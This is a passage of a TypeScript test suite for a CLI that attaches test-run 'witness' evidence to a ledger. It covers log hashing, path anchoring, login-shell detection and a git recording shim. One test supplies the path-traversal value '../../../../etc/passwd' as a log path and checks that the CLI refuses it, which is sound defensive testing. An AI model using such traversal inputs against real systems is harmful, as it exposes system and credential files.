  // because `cwd` happened to be the fixture tree, which is precisely the resolution rule the issue
  // is about: the tests were isolated by the defect. Anchored explicitly, like the ledger, so the
  // isolation survives the fix and a test that wants a foreign cwd can have one.
  const logArgs = args.includes("--logs-root") || omitLogsRoot ? [] : ["--logs-root", stateDir];
  nodeArgs.push(join(import.meta.dirname, "cli.ts"), ...args, ...stateArgs, ...logArgs);
  const run = spawnSync(process.execPath, nodeArgs, {
    cwd: dir,
    encoding: "utf8",
    env: { ...process.env, ...env },
  });
  return { ...run, seen: `${run.stdout}${run.stderr}` };
}

/**
 * A temp tree the CLI can be pointed at: the ledger with a Wave-1 packet in `reviewing`, the two
 * run logs where the schema says they live, and a manifest naming them.
 */
function ingestFixture(
  overrides: Record<string, unknown> = {},
  logOverrides: Partial<{ test: string; revert: string }> = {},
  filesChanged = 1,
) {
  const dir = tmp("foundry-ingest-");
  const { state, id } = reviewingWave1();
  const packet = state.packets[0];
  writeFileSync(join(dir, ".foundry-state.json"), JSON.stringify(state));

  const testLog = logOverrides.test ?? "42 passing\n";
  const revertLog = logOverrides.revert ?? "3 failing\n";
  const logDir = join(dir, "docs", "evidence", "logs", id);
  mkdirSync(logDir, { recursive: true });
  writeFileSync(join(logDir, "test.log"), testLog);
  writeFileSync(join(logDir, "revert.log"), revertLog);

  const sha = (text: string) => createHash("sha256").update(text).digest("hex");
  const manifest = {
    ...boundWitness("e2b", packet.repoId, id),
    testLogSha: sha("42 passing\n"),
    revertLogSha: sha("3 failing\n"),
    testCommand: repoById(packet.repoId)!.testCommand,
    notes: ["produced on the worker host"],
    ...overrides,
  };
  const manifestPath = join(dir, "witness.json");
  writeFileSync(manifestPath, JSON.stringify(manifest));
  return {
    dir,
    id,
    packet,
    manifestPath,
    stub: writeCompareStub(dir, packet.issueNumber, filesChanged),
  };
}

function ledgerAt(dir: string): FactoryState {
  const loaded = loadFactoryState(join(dir, ".foundry-state.json"));
  assert.equal(loaded.ok, true);
  return loaded.state;
}

test("the attach-witness verb exists and carries a legitimate manifest into the ledger", () => {
  const { dir, id, manifestPath, stub } = ingestFixture();
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined, "nothing attached before the run");

  const run = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(run.status, 0, run.seen);
  assert.match(run.stdout, new RegExp(`witness ingested ${id} \\(e2b\\)`));
  // The hashes were recomputed from the logs on disk, and it says so before touching the network.
  assert.match(run.seen, /log hashes recomputed from disk/);

  const after = ledgerAt(dir).packets[0];
  assert.equal(after.evidence?.witness?.provider, "e2b");
  assert.equal(after.evidence?.witness?.baseSha, BASE);
  assert.equal(after.evidence?.witness?.headSha, HEAD);
  assert.equal(after.evidence?.shaVerified, true);
  assert.ok(after.evidence?.notes.some((n) => n.includes("produced on the worker host")));
  assert.equal(evidenceIsReady(after), true, "an ingested witness must reach the promotion gate");

  // ...and the packet really does promote through the verb the doctrine points the operator at.
  const advanced = runCli(dir, ["advance", id]);
  assert.equal(advanced.status, 0, advanced.seen);
  assert.equal(ledgerAt(dir).packets[0].status, "draft-ready");
});

test("attach-witness refuses a manifest whose testCommand is not the repo's oracle", () => {
  const { dir, id, manifestPath, stub } = ingestFixture({ testCommand: "echo green" });
  const run = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(run.status, 1, run.seen);
  assert.match(run.seen, /witness ran `echo green`/);
  assert.match(run.seen, /oracle is `pnpm test`/);
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined, "a refusal must not write the ledger");
});

test("attach-witness refuses when a run log on disk is not what was witnessed", () => {
  // The digest is the whole offer the evidence page makes to a maintainer. A log edited after the
  // run — or a hash covering a log nobody has — must not reach the ledger.
  const { dir, id, manifestPath, stub } = ingestFixture({}, { revert: "3 failing (edited)\n" });
  const tampered = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(tampered.status, 1, tampered.seen);
  assert.match(tampered.seen, /revert log .* does not match the witness sha256/);
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);

  const gone = ingestFixture();
  rmSync(join(gone.dir, "docs", "evidence", "logs", gone.id, "test.log"));
  const missing = runCli(gone.dir, ["attach-witness", gone.id, "--manifest", gone.manifestPath], gone.stub);
  assert.equal(missing.status, 1, missing.seen);
  assert.match(missing.seen, /missing or unreadable/);
  assert.equal(ledgerAt(gone.dir).packets[0].evidence, undefined);
});

/**
 * Issue #80 — the eighth time in this run a fix landed on one call site and not its sibling.
 *
 * #43 anchored `STATE_FILE` to the repository root and gave it a `--state` override, because "the
 * ledger belongs to the repository, not to whatever directory the operator happened to be in".
 * Witness log paths are the same kind of path — `witnessLogPathViolation` refuses anything that is
 * not exactly `docs/evidence/logs/<packetId>/{test,revert}.log`, and its own refusal message says
 * "run logs are repo-root-relative" — but `readIfPresent` resolved them with a bare `resolve()`,
 * which is cwd-relative. So the schema said one thing and the reader did another, and an operator
 * who ran `attach-witness` from anywhere but the repository root had a valid witness rejected as a
 * missing log.
 *
 * The cwd here is deliberately NOT the fixture. Before this, `cwd` was the only thing that made
 * these tests find their logs — the suite was pinning the defect, and the fix could not be red.
 */
test("attach-witness resolves witness logs against the log root, not the operator's cwd", () => {
  const { dir, id, manifestPath, stub } = ingestFixture();
  // Run from a directory that is neither the fixture nor the repository: the only thing that can
  // make the logs findable is the anchor.
  const elsewhere = tmp("foundry-elsewhere-");
  const run = runCli(elsewhere, ["attach-witness", id, "--manifest", manifestPath, "--logs-root", dir], stub, {}, dir);
  assert.equal(run.status, 0, `a valid witness must ingest from any cwd:\n${run.seen}`);
  assert.ok(ledgerAt(dir).packets[0].evidence, "the witness must have reached the ledger");

  // The negative case, from the same foreign cwd: a genuinely missing log still refuses. Without
  // this, "anchor everything to a directory that happens to contain the logs" would also pass.
  const gone = ingestFixture();
  rmSync(join(gone.dir, "docs", "evidence", "logs", gone.id, "test.log"));
  const missing = runCli(
    elsewhere,
    ["attach-witness", gone.id, "--manifest", gone.manifestPath, "--logs-root", gone.dir],
    gone.stub,
    {},
    gone.dir,
  );
  assert.equal(missing.status, 1, missing.seen);
  assert.match(missing.seen, /missing or unreadable/);
  assert.equal(ledgerAt(gone.dir).packets[0].evidence, undefined);
});

/**
 * The OTHER half of #80's split, and the half every fixture was hiding.
 *
 * `readOperatorPath` (cwd-relative) and `readRepoRelative` (log-root-relative) are two functions
 * with the anchor in the name because they were one function with two call sites and one right
 * answer between them. That split is the fix's central design claim — and it was unfalsifiable,
 * because every fixture passed an ABSOLUTE `--manifest`, and `resolve()` ignores its base for an
 * absolute path. Swapping `readOperatorPath` for `readRepoRelative` at the manifest call site left
 * the whole suite green.
 *
 * So: a RELATIVE `--manifest`, typed from a cwd that is not the log root, with the file present in
 * only one of the two trees. `--manifest ./witness.json` means the operator's shell, and nothing
 * else can make it resolve.
 */
test("a relative --manifest is the operator's path, resolved against their shell and not the log root", () => {
  const { dir, id, manifestPath, stub } = ingestFixture();
  // The operator's shell: a third directory, holding the manifest under a name the log root does
  // not have. If the manifest call site ever anchors to the log root, this file is invisible.
  const shell = tmp("foundry-shell-");
  writeFileSync(join(shell, "operator-witness.json"), readFileSync(manifestPath, "utf8"));
  assert.equal(existsSync(join(dir, "operator-witness.json")), false, "the log root must NOT hold this name");

  const run = runCli(
    shell,
    ["attach-witness", id, "--manifest", "operator-witness.json", "--logs-root", dir],
    stub,
    {},
    dir,
  );
  assert.equal(run.status, 0, `a relative --manifest must resolve against the operator's cwd:\n${run.seen}`);
  assert.ok(ledgerAt(dir).packets[0].evidence, "the witness must have reached the ledger");

  // The negative half, from the same shell: a relative path that names nothing still refuses, so
  // "read anything, anywhere" cannot satisfy the assertion above.
  const gone = ingestFixture();
  const absent = runCli(
    shell,
    ["attach-witness", gone.id, "--manifest", "no-such-witness.json", "--logs-root", gone.dir],
    gone.stub,
    {},
    gone.dir,
  );
  assert.equal(absent.status, 1, absent.seen);
  assert.match(absent.seen, /cannot read witness manifest/);
  assert.equal(ledgerAt(gone.dir).packets[0].evidence, undefined);
});

test("the witness log root defaults to the repository root and the state file's own anchor", async () => {
  // The default is the half an override can hide. `--logs-root` above proves the plumbing; this
  // proves that an operator who passes nothing gets the checkout rather than their shell's cwd —
  // which is the whole defect. Asserted through the CLI's own resolver so it cannot be satisfied by
  // a test-local reimplementation of the rule.
  const { witnessLogRootFor } = await import("./cli.ts");
  // `resolve()`d, and that is the assertion, not an incidental. `new URL("..", …)` yields a path
  // with a TRAILING SLASH, and the default branch used to return it raw while the override branch
  // resolved — so `--help` printed `…/oss-foundry//docs/evidence/logs/<packetId>/`, a doubled slash
  // in the one line that tells the operator where the run logs are. `STATE_FILE` normalises for the
  // same reason; the sibling did not.
  const repoRoot = resolve(fileURLToPath(new URL("..", import.meta.url)));
  assert.equal(repoRoot.endsWith("/"), false, "the anchor must be normalised, not merely correct");
  assert.equal(witnessLogRootFor([]), repoRoot);
  assert.equal(witnessLogRootFor(["attach-witness", "pkt_x", "--manifest", "w.json"]), repoRoot);
  assert.equal(witnessLogRootFor(["--logs-root", "/tmp/elsewhere"]), resolve("/tmp/elsewhere"));

  // …AND FROM A CWD THAT IS NOT THE REPOSITORY, through a spawned CLI, because nothing above can
  // tell the anchor from the cwd. This suite runs with cwd set to the repo root, so `resolve(".")`
  // and the anchor are the same string, and "name the value instead" — what this test used to
  // rely on — names a value both answers produce. That is not hypothetical: replacing the default
  // with `resolve(".")` SURVIVED every assertion above once the anchor was normalised. It had only
  // ever been killed by the trailing slash the normalisation removed, which is a coincidence, not
  // a test.
  //
  // `--help` is the surface, and it is the one an operator reads to find their run logs. Deliberately
  // no `--logs-root` and no `--state`: the DEFAULT is the half the bug was in and the half an
  // override hides.
  const elsewhere = realpathSync(tmp("foundry-help-"));
  const help = spawnSync(
    process.execPath,
    ["--experimental-strip-types", join(import.meta.dirname, "cli.ts"), "--help"],
    { cwd: elsewhere, encoding: "utf8", env: { ...process.env, NODE_NO_WARNINGS: "1" } },
  );
  assert.equal(help.status, 0, help.stderr);
  assert.ok(
    help.stdout.includes(`Witness logs: ${repoRoot}/docs/evidence/logs/<packetId>/`),
    `--help must name the checkout, with one slash, whatever the cwd:\n${help.stdout}`,
  );
  assert.equal(
    help.stdout.includes(elsewhere),
    false,
    `--help named the operator's shell as the log root:\n${help.stdout}`,
  );
});

test("attach-witness refuses a manifest that names logs outside its own packet", () => {
  // Driven end to end because this is the one input that decides which file the CLI opens.
  const { dir, id, manifestPath, stub } = ingestFixture({ testLogPath: "../../../../etc/passwd" });
  const run = runCli(dir, ["attach-witness", id, "--manifest", manifestPath], stub);
  assert.equal(run.status, 1, run.seen);
  assert.match(run.seen, /log path/i);
  assert.doesNotMatch(run.seen, /root:/, "nothing outside the tree may be read, let alone hashed");
  assert.equal(ledgerAt(dir).packets[0].evidence, undefined);
});

test("witnessed run logs are written where the schema says, and land verifiable", async () => {
  // #36's "logs persisted" bullet. The CLI's writer was reachable from no test at all: deleting
  // the call left the suite green, and a digest whose logs were never written is not evidence.
  const { persistWitnessLogs } = await import("./cli.ts");
  const { witnessLogPaths } = await import("./witness.ts");
  const root = tmp("foundry-persist-");
  const { runner } = fakeRunner({
    "run-tests@head": { exit: 0, output: "42 passing" },
    "run-tests@revert": { exit: 1, output: "3 failing" },
  });
  const outcome = await witnessEvidence(
    {
      packetId: "pkt_ravidsrk_orca-fleet_71",
      repoId: "ravidsrk/orca-fleet",
      baseSha: BASE,
      headSha: HEAD,
      testCommand: "python3 scripts/validate.py",
      sandbox: "host",
      wave: 0,
    },
    runner,
    {},
  );
  assert.equal(outcome.ok, true);
  if (!outcome.ok) return;

  persistWitnessLogs(outcome.witness, outcome.logs, root);
  const want = witnessLogPaths("pkt_ravidsrk_orca-fleet_71");
  assert.equal(outcome.witness.testLogPath, want.testLogPath);
  assert.equal(readFileSync(join(root, want.testLogPath), "utf8"), "42 passing");
  assert.equal(readFileSync(join(root, want.revertLogPath), "utf8"), "3 failing");
  // The bytes on disk are what the declared sha256 covers — the maintainer's recompute succeeds.
  const read = (p: string) => {
    try {
      return readFileSync(join(root, p), "utf8");
    } catch {
      return undefined;
    }
  };
  assert.equal(verifyWitnessLogs(outcome.witness, read).ok, true);
});

/**
 * "INERT FOR A REAL OPERATOR" — the sentence written at the guard, which nothing held it to.
 *
 * `persistWitnessLogs` refuses to write the repo-root run logs when three things are true together:
 * the root is the default, no `--logs-root` was given, and `NODE_TEST_CONTEXT` is set. The third
 * conjunct is the entire reason the guard is safe to ship — and dropping it was GREEN. Every test in
 * this suite passes `--logs-root`, so `LOGS_ROOT_FLAG` is always set and the conjunction short-
 * circuits before the environment is ever read; the operator half of the condition was reached by
 * nothing. Under that mutant an operator running the documented
 * `evidence <id> --base <sha> --head <sha>` — with no `--logs-root`, which is the only way the verb
 * is documented — is refused with "refusing to write the repo-root run logs … from a test run", and
 * the witness they just paid for is thrown away.
 *
 * Driven as a child process because `NODE_TEST_CONTEXT` is set for THIS process by `node --test` and
 * inherited by everything it spawns. An operator's shell does not have it, and that difference is
 * the guard; a child is the only place the absence can be staged. The witness names ABSOLUTE log
 * paths so the write lands in a temp directory instead of the developer's checkout — what is under
 * test here is whether the guard fires, and where the default root points is pinned separately, by
 * `witnessLogRootFor` and by the `--help` drive above.
 *
 * Both directions, in one test: the operator half on its own is satisfied by deleting the guard.
 */
test("the repo-root log-write refusal is inert for an operator and fires for a test run", () => {
  const dir = tmp("foundry-operator-logs-");
  const script = join(dir, "persist.mjs");
  writeFileSync(
    script,
    `import { persistWitnessLogs } from ${JSON.stringify(pathToFileURL(join(import.meta.dirname, "cli.ts")).href)};\n` +
      `const [testLog, revertLog] = process.argv.slice(2);\n` +
      // No third argument, so `root` takes its default: the production `LOGS_ROOT`.
      `persistWitnessLogs(\n` +
      `  { testLogPath: testLog, revertLogPath: revertLog },\n` +
      `  { test: "42 passing", revert: "3 failing" },\n` +
      `);\n` +
      `console.log("PERSISTED");\n`,
  );

  // Deliberately no `--logs-root` on the child's argv: that flag is the OTHER conjunct, and passing
  // it is exactly what every existing test does — which is why this path was never reached.
  const persist = (label: string, nodeTestContext: string | undefined) => {
    const env: Record<string, string> = { ...process.env, NODE_NO_WARNINGS: "1" } as Record<string, string>;
    if (nodeTestContext === undefined) delete env.NODE_TEST_CONTEXT;
    else env.NODE_TEST_CONTEXT = nodeTestContext;
    const testLog = join(dir, `${label}-test.log`);
    const revertLog = join(dir, `${label}-revert.log`);
    const run = spawnSync(process.execPath, ["--experimental-strip-types", script, testLog, revertLog], {
      cwd: dir,
      encoding: "utf8",
      env,
    });
    return { ...run, seen: `${run.stdout}${run.stderr}`, testLog, revertLog };
  };

  const operator = persist("operator", undefined);
  assert.equal(operator.status, 0, operator.seen);
  assert.doesNotMatch(
    operator.seen,
    /refusing to write the repo-root run logs/,
    "an operator running `evidence` with no --logs-root was refused by a guard whose only subject is this suite",
  );
  assert.equal(readFileSync(operator.testLog, "utf8"), "42 passing");
  assert.equal(readFileSync(operator.revertLog, "utf8"), "3 failing");

  const underTest = persist("under-test", "child");
  assert.equal(underTest.status, 1, underTest.seen);
  assert.match(underTest.seen, /refusing to write the repo-root run logs/, underTest.seen);
  assert.match(underTest.seen, /--logs-root <tmpdir>/, underTest.seen);
  assert.equal(existsSync(underTest.testLog), false, "the refusal must refuse BEFORE it writes");
  assert.equal(existsSync(underTest.revertLog), false);
});

// --- The `evidence` verb, driven end to end (issue #36) ---
//
// The persist test above calls `persistWitnessLogs` directly, so it locks the function's body and
// nothing else: deleting the call in cli.ts, or moving it back above the `applyAttachEvidence`
// error check that it was moved below, both left the suite green. No test drove the `evidence`
// verb at all. The version that shipped green never writes the logs, so `attach-witness` later
// refuses `missing or unreadable` and the evidence page's "Recompute it yourself" line points at
// files nobody has — #36's defect, restored.
//
// So these run the real verb: a real clone, the repo's real test command, both runs, on a local
// origin the child is pointed at with `GIT_CONFIG_GLOBAL` + `url.insteadOf`. Only `compareCommits`
// is stubbed, exactly as the ingest tests do.

/**
 * The `evidence` fixtures' temp trees are registered by `tmp()` itself (factory/tmp-dir.ts).
 *
 * This file used to carry its own `evidenceScratch` list plus an `after()` hook, and
 * `terminal.test.ts` carried the same six lines again, while the other five test files had no
 * cleanup at all. One home now — the rule `fixture-counts.ts` states about two copies of one rule
 * applies to cleanup as much as to fixtures, and issue #64 is what the drift cost.
 */

/**
 * The environment variable `LOGIN_SHELL_PROFILE` exports and `scripts/validate.py` refuses on.
 *
 * `hostRunner`'s non-login contract had a test (`witness-host.test.ts`) and the operator's path
 * had none: the single `hostRunner,` argument at the `evidence` verb's `witnessEvidence` call was
 * held by nothing. Substituting a `bash -lc` runner there reintroduced issue #41 on the only path
 * an operator actually runs, with the suite green, because this fixture's `scripts/validate.py`
 * was `sys.exit(0)` — green under every shell by construction, so it could not discriminate.
 */
const LOGIN_SHELL_MARKER = "FOUNDRY_WITNESS_SAW_LOGIN_SHELL";

/**
 * A `~/.bash_profile` + `~/.profile` pair exporting {@link LOGIN_SHELL_MARKER}, written into a
 * `HOME` the CLI child is pointed at.
 *
 * This is bash's own documented startup sequence rather than a platform quirk: a *login* shell
 * sources `/etc/profile` and then the first of `~/.bash_profile`, `~/.bash_login`, `~/.profile`;
 * `bash -c` sources none of them. So the marker is present exactly when the witness ran the shell
 * the contract forbids — on Linux and CI as much as on the macOS machine where `path_helper`
 * happened to be the mechanism that cost issue #41 its interpreter.
 */
function loginShellProfile(home: string): void {
  const marker = `export ${LOGIN_SHELL_MARKER}=1\n`;
  mkdirSync(home, { recursive: true });
  writeFileSync(join(home, ".bash_profile"), marker);
  writeFileSync(join(home, ".profile"), marker);
}

/**
 * A git repo standing in for the Wave 0 target. Head is green under the allowlist's real
 * `testCommand`; reverting the one non-test file to base makes it red, so the negative control
 * genuinely goes red instead of being asserted. Built once — the CLI only ever clones from it.
 */
let originRepo: { path: string; base: string; head: string } | undefined;
function wave0Origin(): { path: string; base: string; head: string } {
  if (originRepo) return originRepo;
  const path = tmp("foundry-origin-");
  const git = (...args: string[]) => {
    const run = spawnSync(
      "git",
      ["-C", path, "-c", "user.email=fixture@example.invalid", "-c", "user.name=Fixture", "-c", "commit.gpgsign=false", ...args],
      // The fixture must not inherit the developer's global git config (signing keys, hooks,
      // templates); the CLI child gets its own global config below.
      { encoding: "utf8", env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null" } },
    );
    assert.equal(run.status, 0, `git ${args.join(" ")}: ${run.stdout}${run.stderr}`);
    return run.stdout.trim();
  };
  const write = (rel: string, text: string) => {
    mkdirSync(join(path, dirname(rel)), { recursive: true });
    writeFileSync(join(path, rel), text);
  };

  const init = spawnSync("git", ["init", "-q", "-b", "main", path], {
    encoding: "utf8",
    env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null" },
  });
  assert.equal(init.status, 0, `git init: ${init.stdout}${init.stderr}`);
  const suite = (expected: string) =>
    `import unittest\n\n\nclass AnswerTest(unittest.TestCase):\n    def test_answer(self):\n        with open("src/answer.txt") as handle:\n            self.assertEqual(handle.read().strip(), "${expected}")\n`;
  // Not `sys.exit(0)`. The allowlist's `testCommand` is fixed (`python3 scripts/validate.py && …`)
  // and the headline criterion is that it runs unedited, so the *repo* is where this fixture gets
  // to care which shell invoked it. `validate.py` is the first thing that command runs, and it
  // fails the run when the witness's shell sourced a login profile — which is precisely the
  // condition under which macOS `path_helper` re-resolved `python3` to 3.9.6 in issue #41.
  write(
    "scripts/validate.py",
    "import os\nimport sys\n\n" +
      `if os.environ.get(${JSON.stringify(LOGIN_SHELL_MARKER)}):\n` +
      '    sys.stderr.write("validate.py: the witness ran a LOGIN shell — see issue #41\\n")\n' +
      "    sys.exit(1)\n\nsys.exit(0)\n",
  );
  write("src/answer.txt", "wrong\n");
  write("tests/test_answer.py", suite("wrong"));
  git("add", "-A");
  git("commit", "-q", "-m", "base");
  const base = git("rev-parse", "HEAD");

  write("src/answer.txt", "right\n");
  write("tests/test_answer.py", suite("right"));
  git("add", "-A");
  git("commit", "-q", "-m", "fix the answer\n\nFixes #71");
  const head = git("rev-parse", "HEAD");
  git("config", "uploadpack.allowAnySHA1InWant", "true");

  originRepo = { path, base, head };
  return originRepo;
}

/**
 * A `git` on the child's PATH that appends every invocation to a file and then execs the real one.
 * This is the injected runner the ordering test reads: `witnessEvidence`'s very first act on the
 * host path is `git clone`, so an empty record is proof the witness never ran — not an inference
 * from how long the refusal took. The positive control in the same test runs a well-bound range
 * through the same shim and sees the clone recorded, so an empty record cannot mean a dead shim.
 */
function recordingGit(dir: string): { binDir: string; record: string; calls: () => string[] } {
  const realGit = spawnSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).stdout.trim();
  assert.match(realGit, /git$/, "the shim needs a real git to delegate to");
  const binDir = join(dir, "bin");
  mkdirSync(binDir, { recursive: true });
  const record = join(dir, "git-calls.log");
  const shim = join(binDir, "git");
  writeFileSync(shim, `#!/bin/sh\nprintf '%s\\n' "$*" >> ${JSON.stringify(record)}\nexec ${JSON.stringify(realGit)} "$@"\n`);
  chmodSync(shim, 0o755);
  return {
    binDir,
    record,
    calls: () => {
      try {
        return readFileSync(record, "utf8").split("\n").filter(Boolean);
      } catch {
        return [];
      }
    },
  };
}

/**
 * A work tree the `evidence` verb can be run in: the ledger holding the Wave 0 packet in
 * `reviewing`, a `compareCommits` stub reporting `filesChanged` files, and a git config that
 * rewrites the upstream clone URL to the local origin so nothing touches the network. `message` is
 * what the stubbed compare reports as the range's commit message — the input the binding is
 * decided from, and the only thing the ordering test varies.
 */
function evidenceFixture(filesChanged = 2, message = "fix the answer\n\nFixes #71") {
  const origin = wave0Origin();
  const dir = tmp("foundry-evidence-");
  const { state, id } = reviewing();
  assert.equal(state.packets[0].repoId, "ravidsrk/orca-fleet", "the evidence verb is host/Wave 0 only");
  writeFileSync(join(dir, ".foundry-state.json"), JSON.stringify(state));

  const canned = {
    status: "ahead",
    ahead_by: 1,
    behind_by: 0,
    files: Array.from({ length: filesChanged }, () => ({ additions: 1, deletions: 1 })),
    commits: [{ commit: { message } }],
  };
  const stub = join(dir, "stub-github.mjs");
  writeFileSync(
    stub,
    `const canned = ${JSON.stringify(canned)};\n` +
      `globalThis.fetch = async (url) => {\n` +
      `  const u = String(url);\n` +
      `  if (u.includes("/compare/")) {\n` +
      `    return new Response(JSON.stringify(canned), { status: 200, headers: { "content-type": "application/json" } });\n` +
      `  }\n` +
      `  throw new Error("unstubbed fetch: " + u);\n` +
      `};\n`,
  );

  const gitconfig = join(dir, "gitconfig");
  writeFileSync(gitconfig, `[url "${origin.path}"]\n\tinsteadOf = https://github.com/ravidsrk/orca-fleet.git\n`);

  // The trap the shell contract is measured with. `GIT_CONFIG_GLOBAL` above already keeps git off
  // this `HOME`, so the only thing in it is the profile a login shell would source and the witness
  // must not. It is inert against correct code and fatal against `bash -lc`.
  const home = join(dir, "home");
  loginShellProfile(home);

  const logPaths = [
    join(dir, "docs", "evidence", "logs", id, "test.log"),
    join(dir, "docs", "evidence", "logs", id, "revert.log"),
  ];
  const git = recordingGit(dir);
  const childEnv = {
    GIT_CONFIG_GLOBAL: gitconfig,
    HOME: home,
    PATH: `${git.binDir}:${process.env.PATH ?? ""}`,
  };
  // `from` exists so the WRITE side of issue #80 can be observed. With cwd and the log root the
  // same directory — which is what every caller here wants — a `persistWitnessLogs` that resolved
  // against `"."` and one that resolved against the anchor put the files in the identical place,
  // so no assertion could tell them apart. Separating the two is the only thing that can.
  const runEvidence = (from: string = dir, omitLogsRoot = false) =>
    runCli(from, ["evidence", id, "--base", origin.base, "--head", origin.head], stub, childEnv, dir, omitLogsRoot);
  /** The pre-flight, run from the same working directory and the same environment as the witness. */
  const runWitnessCheck = () => runCli(dir, ["witness-check", "ravidsrk/orca-fleet"], stub, childEnv);
  return { dir, id, origin, logPaths, runEvidence, runWitnessCheck, gitCalls: git.calls };
}

function exists(path: string): boolean {
  try {
    readFileSync(path);
    return true;
  } catch {
    return false;
  }
}

test("a spawned CLI that forgot --logs-root refuses rather than writing into the real checkout", () => {
  // The cost of anchoring, and the half of #43 that has to come with it.
  //
  // `persist` carries this comment for the ledger: "Anchoring `STATE_FILE` took away the isolation
  // that spawned-CLI tests were getting for free from a temp cwd: with the path fixed to the repo
  // root, a test that forgets `--state` reads and writes the developer's real ledger, and the damage
  // lands in whichever *other* test file reads it next." Anchoring `LOGS_ROOT` does the identical
  // thing to the run logs, and it is not hypothetical — an intermediate state of this very change
  // left two real run logs sitting in `docs/evidence/logs/` in the working checkout.
  //
  // Same guard, same shape, same reason: refuse at the WRITE, only for the un-overridden repo-root
  // default, and only under `node --test` (`NODE_TEST_CONTEXT`), so it is inert for an operator.
  const { dir, id, runEvidence } = evidenceFixture();
  const repoRoot = fileURLToPath(new URL("..", import.meta.url));
  const leaked = join(repoRoot, "docs", "evidence", "logs", id);
  // Scrubbed FIRST, so the assertion below is about this run and not about the tree's history. It
  // also keeps the mutant that disables the guard from poisoning the next baseline: without this,
  // proving the guard matters would leave behind the very artifact the guard exists to prevent.
  rmSync(leaked, { recursive: true, force: true });

  const run = runEvidence(dir, true);
  assert.equal(run.status, 1, `a forgotten --logs-root must refuse:\n${run.seen}`);
  assert.match(run.seen, /refusing to write .* run logs?/i, run.seen);
  assert.match(run.seen, /--logs-root/, run.seen);
  // The claim is the filesystem, not the message: nothing may reach the real checkout.
  assert.equal(
    exists(join(leaked, "test.log")),
    false,
    "a test run must never write run logs into the developer's own checkout",
  );
  rmSync(leaked, { recursive: true, force: true });
});

test("the evidence verb writes its run logs under the log root, not beside the operator's shell", () => {
  // The WRITE half of issue #80, and the half the first pass of this fix left untested — the
  // mutation audit found it by putting `persistWitnessLogs`'s default back to `"."` and watching
  // the whole suite stay green. Which is the defect this repository keeps shipping, arriving one
  // more time inside the change that was meant to close it: the read anchor had a test, its sibling
  // did not, and the two were indistinguishable as long as cwd happened to be the log root.
  //
  // What it would cost: the ledger records `docs/evidence/logs/<id>/test.log` and the evidence page
  // offers a maintainer `shasum -a 256` over that path in the Foundry checkout — while the bytes
  // sit in whatever directory the operator was standing in. The recompute offer, which is the whole
  // proof, resolves to nothing.
  const { dir, id, logPaths, runEvidence } = evidenceFixture();
  const elsewhere = tmp("foundry-evidence-cwd-");

  const run = runEvidence(elsewhere);
  assert.equal(run.status, 0, run.seen);
  for (const path of logPaths) {
    assert.ok(exists(path), `${path} was never written from a foreign cwd: ${run.seen}`);
  }
  // …and nothing was written next to the shell instead.
  assert.equal(
    exists(join(elsewhere, "docs", "evidence", "logs", id, "test.log")),
    false,
    "run logs must not land in the operator's working directory",
  );
  // The ledger's own claim about where they are still holds, which is what a maintainer acts on.
  const witness = ledgerAt(dir).packets[0].evidence?.witness;
  assert.equal(witness?.testLogPath, `docs/evidence/logs/${id}/test.log`);
  assert.ok(exists(join(dir, witness!.testLogPath)), "the ledger's path must resolve under the log root");
});

test("the evidence verb writes the run logs its own ledger entry points at", () => {
  const { dir, id, origin, logPaths, runEvidence } = evidenceFixture();

  const run = runEvidence();
  assert.equal(run.status, 0, run.seen);
  assert.match(run.stdout, new RegExp(`evidence attached ${id}`));

  const witness = ledgerAt(dir).packets[0].evidence?.witness;
  assert.ok(witness, run.seen);
  assert.equal(witness!.provider, "host");
  assert.equal(witness!.baseSha, origin.base);
  assert.equal(witness!.headSha, origin.head);
  assert.equal(witness!.testExit, 0);
  assert.notEqual(witness!.revertExit, 0, "the negative control ran and went red for real");

  // The point of the whole exercise: the paths the ledger and the evidence page name resolve to
  // files, and those files hash to the digests the page offers the maintainer.
  for (const path of logPaths) assert.ok(exists(path), `${path} was never written: ${run.seen}`);
  const read = (rel: string) => {
    try {
      return readFileSync(join(dir, rel), "utf8");
    } catch {
      return undefined;
    }
  };
  assert.equal(verifyWitnessLogs(witness!, read).ok, true, "the maintainer's recompute must succeed");
  // ...and the two logs are different files, not one result copied twice.
  assert.notEqual(read(witness!.testLogPath!), read(witness!.revertLogPath!));
});

test("the evidence verb runs the repo's command in the non-login shell the contract promises", () => {
  // Issue #41 at the only place an operator meets it. `hostRunner`'s shell is asserted directly in
  // `witness-host.test.ts`, but the `evidence` verb reaches it through exactly one argument —
  // `hostRunner,` at the `witnessEvidence` call in cli.ts — and that argument was held by nothing.
  // Swapping in a `bash -lc` runner there restored #41's defect on the operator's real path and
  // the whole suite stayed green, because the fixture repo's `validate.py` was `sys.exit(0)`.
  //
  // So the fixture repo now refuses a login shell, and the allowlist's `testCommand` runs unedited
  // over it. This is the CLI's own child process: nothing about the shell is stubbed.
  const { dir, runEvidence } = evidenceFixture();
  assert.ok(
    readFileSync(join(dir, "home", ".bash_profile"), "utf8").includes(LOGIN_SHELL_MARKER),
    "the trap must actually be armed, or this test passes by not springing it",
  );

  const run = runEvidence();
  assert.equal(
    run.status,
    0,
    `the witness ran a login shell (issue #41) — a login bash sources ~/.bash_profile, and the ` +
      `repo's own testCommand refused on the marker it exports:\n${run.seen}`,
  );
  assert.doesNotMatch(run.seen, /LOGIN shell/, run.seen);
  assert.ok(ledgerAt(dir).packets[0].evidence?.witness, run.seen);
});

test("the toolchain the witness records is the one witness-check predicted for the same repo", () => {
  // The pre-flight's entire value is that it cannot disagree with the run (witness.ts's
  // `hostRunner` docstring, docs/10-schemas.md). Nothing checked the two agree, so a witness
  // resolving through a different shell than the pre-flight — a green pre-flight and a red
  // witness, the #41 shape — was invisible. Both halves run here, from one working directory.
  const { dir, runEvidence, runWitnessCheck } = evidenceFixture();

  const preflight = runWitnessCheck();
  assert.equal(preflight.status, 0, preflight.seen);
  const predicted = /^ {2}toolchain a witness from here would record: (.+)$/m.exec(preflight.stdout)?.[1];
